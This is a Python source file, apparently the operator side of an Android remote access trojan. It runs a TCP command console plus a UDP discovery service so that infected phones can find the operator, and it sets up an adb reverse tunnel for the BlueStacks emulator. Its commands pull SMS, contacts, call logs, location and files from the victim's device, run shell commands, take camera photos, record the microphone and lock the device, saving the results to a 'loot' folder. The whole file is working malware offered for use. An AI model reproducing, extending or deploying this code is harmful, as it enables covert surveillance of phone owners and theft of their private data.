#!/usr/bin/env python3
# c2.py - TCP command console for the Android implant
import base64
import json
import os
import shlex
import socket
import subprocess
import threading
import time

HOST = "0.0.0.0"
PORT = 4444
DISCOVERY_PORT = 4445
DISCOVERY_MAGIC = b"RAT_DISCOVER"
OUTDIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(OUTDIR, exist_ok=True)

BLUESTACKS_CONF = r"C:\ProgramData\BlueStacks_nxt\bluestacks.conf"
HD_ADB = r"C:\Program Files\BlueStacks_nxt\HD-Adb.exe"

clients = {}
clients_lock = threading.Lock()
next_id = [1]
selected = [None]


def send(conn, payload):
    conn.sendall((json.dumps(payload) + "\n").encode("utf-8"))


def render(cid, message):
    if not message.get("ok", False):
        print(f"\n[{cid}] error: {message.get('error')}\n> ", end="", flush=True)
        return

    data = message.get("data")

    if isinstance(data, dict) and "data" in data:
        mime = data.get("mime", "")
        name = data.get("name") or f"{cid}_{int(time.time())}"
        if not os.path.splitext(name)[1]:
            ext = ".jpg" if "image" in mime else ".m4a" if "audio" in mime else ".bin"
            name += ext
        path = os.path.join(OUTDIR, os.path.basename(name))
        with open(path, "wb") as handle:
            handle.write(base64.b64decode(data["data"]))
        print(f"\n[{cid}] saved {path} ({data.get('size', '?')} bytes)\n> ", end="", flush=True)
        return

    print(f"\n[{cid}] {json.dumps(data, ensure_ascii=False)}\n> ", end="", flush=True)


def client_thread(conn, addr):
    cid = None
    buffer = b""
    try:
        conn.settimeout(15)
        while b"\n" not in buffer:
            chunk = conn.recv(4096)
            if not chunk:
                return
            buffer += chunk
        conn.settimeout(None)

        line, buffer = buffer.split(b"\n", 1)
        info = {}
        try:
            hello = json.loads(line.decode("utf-8", "replace"))
            if hello.get("type") == "hello":
                info = hello.get("device", {})
        except Exception:
            pass

        with clients_lock:
            cid = f"dev{next_id[0]}"
            next_id[0] += 1
            clients[cid] = {"conn": conn, "info": info}

        banner = (
            f"{info.get('brand', '?')} {info.get('model', '?')} | "
            f"Android {info.get('release', '?')} (SDK {info.get('sdk', '?')})"
        )
        print(f"\n[+] {cid} from {addr[0]} - {banner}\n> ", end="", flush=True)

        while True:
            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                if line.strip():
                    try:
                        render(cid, json.loads(line.decode("utf-8", "replace")))
                    except Exception:
                        pass
            chunk = conn.recv(65536)
            if not chunk:
                break
            buffer += chunk
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass
        if cid:
            with clients_lock:
                clients.pop(cid, None)
            print(f"\n[-] {cid} disconnected\n> ", end="", flush=True)


def accept_loop(server):
    while True:
        try:
            conn, addr = server.accept()
        except OSError:
            return
        threading.Thread(target=client_thread, args=(conn, addr), daemon=True).start()


def build_request(parts):
    name = parts[0].lstrip("/")
    arg = " ".join(parts[1:]) if len(parts) > 1 else ""
    request = {"id": str(int(time.time() * 1000))}

    if name in ("ping", "info", "sms", "contacts", "calllog", "lock"):
        request["cmd"] = name
    elif name == "location":
        request["cmd"] = "location"
    elif name == "ls":
        request["cmd"] = "ls"
        request["path"] = arg or "/sdcard"
    elif name == "pull":
        if not arg:
            return None
        request["cmd"] = "pull"
        request["path"] = arg
    elif name in ("shell", "sh"):
        request["cmd"] = "shell"
        request["arg"] = arg
    elif name == "camera":
        request["cmd"] = "camera"
        request["facing"] = arg or "back"
    elif name == "mic":
        request["cmd"] = "mic"
        request["seconds"] = int(arg) if arg.isdigit() else 10
    elif name == "toast":
        request["cmd"] = "toast"
        request["arg"] = arg
    else:
        request["cmd"] = "shell"
        request["arg"] = " ".join(parts)
    return request


def console():
    print("C2 ready.")
    print("commands: list | use <id> | /info /sms /contacts /calllog /location /ls <path>")
    print("          /pull <path> /shell <cmd> /camera <front|back> /mic <sec> /toast <text>")
    print("anything else is sent as a shell command")
    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            # headless: stdin closed, keep listeners alive
            while True:
                time.sleep(3600)
        if not line:
            continue
        if line in ("exit", "quit"):
            break
        try:
            parts = shlex.split(line)
        except ValueError as exc:
            print(f"parse error: {exc}")
            continue

        name = parts[0]

        if name == "list":
            with clients_lock:
                if not clients:
                    print("no clients online")
                for cid, meta in clients.items():
                    info = meta["info"]
                    print(f"{cid}: {info.get('brand', '?')} {info.get('model', '?')} "
                          f"Android {info.get('release', '?')}")
            continue

        if name == "use":
            if len(parts) < 2 or parts[1] not in clients:
                print("unknown client id")
                continue
            selected[0] = parts[1]
            print(f"using {parts[1]}")
            continue

        if name == "unselect":
            selected[0] = None
            print("client unselected")
            continue

        cid = selected[0]
        if not cid or cid not in clients:
            print("select a client first: use dev1")
            continue

        request = build_request(parts)
        if request is None:
            print("usage: /pull <path>")
            continue

        try:
            send(clients[cid]["conn"], request)
        except Exception as exc:
            print(f"send failed: {exc}")


def local_ipv4_addresses():
    """Every usable IPv4 on this host, recomputed on demand.

    Binding on 0.0.0.0 already covers all of them; this list is only used for
    the startup banner and as a discovery fallback.
    """
    addresses = []

    def add(address):
        if address and address not in addresses:
            addresses.append(address)

    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            add(info[4][0])
    except OSError:
        pass

    add("127.0.0.1")
    return addresses


def advertise_ip_for(peer_ip):
    """Return the local IP the client can actually reach us on.

    A throwaway UDP socket is "connected" to the peer so the OS picks the
    outgoing interface; getsockname() then reports that interface's address.
    """
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((peer_ip, DISCOVERY_PORT))
        return probe.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        probe.close()


def discovery_loop():
    """Answer broadcast probes with our current IP.

    This is what lets the implant follow the laptop without a hardcoded
    address: the APK broadcasts, we reply with whatever IP we hold right now.
    """
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        udp.bind((HOST, DISCOVERY_PORT))
    except OSError as exc:
        print(f"discovery disabled: udp {HOST}:{DISCOVERY_PORT} ({exc})")
        udp.close()
        return

    print(f"discovery listening on udp {HOST}:{DISCOVERY_PORT}")
    while True:
        try:
            data, addr = udp.recvfrom(256)
        except OSError:
            return
        if data.strip() != DISCOVERY_MAGIC:
            continue
        reply = json.dumps({
            "ip": advertise_ip_for(addr[0]),
            "port": PORT
        }).encode("utf-8")
        try:
            udp.sendto(reply, addr)
        except OSError:
            pass


def bluestacks_adb_port():
    try:
        with open(BLUESTACKS_CONF, "r", encoding="utf-8", errors="replace") as conf:
            for line in conf:
                key, _, value = line.partition("=")
                if key.endswith(".status.adb_port"):
                    return value.strip().strip('"')
    except OSError:
        pass
    return None


def setup_emulator_bridge():
    """Best-effort: connect to BlueStacks and reverse-forward our port.

    With the reverse tunnel in place the implant reaches us on 127.0.0.1,
    which is independent of whatever Wi-Fi the laptop is attached to.
    """
    if os.name != "nt" or not os.path.exists(HD_ADB):
        return

    def run(*args):
        try:
            subprocess.run(
                [HD_ADB, *args],
                capture_output=True, timeout=15,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)
            )
        except Exception:
            pass

    port = bluestacks_adb_port()
    if port:
        run("connect", f"127.0.0.1:{port}")
    run("reverse", f"tcp:{PORT}", f"tcp:{PORT}")
    print(f"adb reverse tcp:{PORT} -> tcp:{PORT} ready (emulator path)")


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((HOST, PORT))
        server.listen(16)
    except OSError as exc:
        raise SystemExit(f"could not bind {HOST}:{PORT} ({exc})")

    print(f"listening on {HOST}:{PORT}")
    for address in local_ipv4_addresses():
        print(f"  reachable at {address}:{PORT}")

    threading.Thread(target=accept_loop, args=(server,), daemon=True).start()
    threading.Thread(target=discovery_loop, daemon=True).start()
    setup_emulator_bridge()

    try:
        console()
    except KeyboardInterrupt:
        pass
    finally:
        server.close()


if __name__ == "__main__":
    main()
